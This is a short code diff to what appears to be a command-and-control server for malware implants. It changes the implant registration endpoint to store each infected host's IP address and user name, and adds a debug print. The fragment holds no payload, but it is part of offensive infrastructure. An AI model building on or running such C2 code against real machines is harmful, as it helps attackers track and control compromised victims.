@@ -27,7 +27,7 @@ implant_db = storage.ImplantDatabase()
 commandlog_db = storage.CommandLogDatabase()
 
 # FOR TESTING only
-implant_db.add_implant(storage.Implant(name="test", major_v="10", build_num="1000", sleep_time=10))
+implant_db.add_implant(storage.Implant(name="test", major_v="10", build_num="1000", sleep_time=10, IP="127.0.0.1", user="test/user"))
 
 AES_INSTANCE = encryption.AESCipher(ENC_KEY)
 
@@ -88,17 +88,21 @@ def implant_register():
         major_v = data.split(":::")[0]
         build_num = data.split(":::")[1]
         sleep_time = data.split(":::")[2]
+        user = data.split(":::")[3]
 
         # Generate a name
         new_implant_name = encryption.id_generator(N=4)
         # Print for debug
         print(new_implant_name)
+        print(data)
 
         # Add the new implant to the implant_db
         implant_db.add_implant(storage.Implant(name=new_implant_name,
                                                major_v=major_v,
                                                build_num=build_num,
-                                               sleep_time=sleep_time
+                                               sleep_time=sleep_time,
+                                               IP=request.remote_addr,
+                                               user=user
                                               ))
 
         # Update the operators
